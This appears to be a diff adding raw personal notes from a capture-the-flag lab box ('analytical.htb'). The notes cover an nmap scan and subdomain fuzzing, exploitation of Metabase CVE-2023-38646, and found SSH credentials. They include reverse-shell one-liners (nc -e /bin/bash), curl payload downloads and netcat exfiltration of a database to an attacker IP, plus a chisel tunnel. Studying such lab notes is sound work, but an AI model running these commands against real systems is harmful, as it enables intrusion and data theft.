@@ -1,0 +1,131 @@
+10.10.11.233
+
+metalytics
+An4lytics_ds20223#
+
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+# Nmap 7.94SVN scan initiated Sat Dec  9 19:14:09 2023 as: nmap -sCV -Pn -p- --open -o analytics-nmap 10.10.11.233
+Nmap scan report for 10.10.11.233
+Host is up (0.060s latency).
+Not shown: 65525 closed tcp ports (conn-refused), 8 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://analytical.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Dec  9 19:14:41 2023 -- 1 IP address (1 host up) scanned in 32.07 seconds
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+
+Jonnhy Smith
+Alex Kirigo
+Daniel Walker
+
+due@analytical.com
+demo@analytical.com
+
+http://analytical.htb/js/.DS_Store
+
+mongoDB ?
+
+
+/api/session/properties
+
+{"name":"project-id","display-name":"Project ID (override)","helper-text":"Project ID to be used for authentication. You can omit this field if you are only querying datasets owned by your organization.","required":false,"placeholder":"1w08oDRKPrOqBt06yxY8uiCz2sSvOp3u"},
+
+"version":{"date":"2023-06-29","tag":"v0.46.6","branch":"release-x.46.x","hash":"1bb88f5"},
+
+
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.analytical.htb" --hc 403,400,301 --hl 335 -t 50 10.10.11.233
+
+** Unauthen rce
+ref :https://github.com/vulhub/vulhub/tree/master/metabase/CVE-2023-38646
+
+GET /api/session/properties
+
+"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
+
+curl 10.10.16.72/rev.sh -o /tmp/rev.sh
+curl 10.10.16.72/ncat -o /tmp/nc
+chmod 777 /tmp/nc
+
+exec('/bin/bash -c {curl,10.10.16.72/`pwd`}')
+
+/bin/bash -c {nc,10.10.16.72,443,-e,/bin/bash}
+
+
+nc -l -p 1234 > metabase.db
+nc -w 3 10.10.16.72 1234 < DigiCertGlobalRootG2.crt.pem
+
+cat ./metabase.db | nc -N 10.10.16.72 5144
+nc -l -p 5144 > metabase.db
+
+
+META_USER=metalytics
+META_PASS=An4lytics_ds20223#
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+ssh metalytics@10.10.11.233
+An4lytics_ds20223#
+
+127.0.0.1:3000 ? still metabase ?
+
+
+/tmp/tmux-1000 ?
+
+-rwxr-sr-x 1 root tty 23K Feb 21  2022 /usr/bin/write.ul (Unknown SGID binary)
+
+
+
+./chisel64 server -p 8088 --reverse
+./chisel64 client 10.10.16.72:8088 R:3000:127.0.0.1:3000
+
+
+https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629 ???
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------------------
+
+
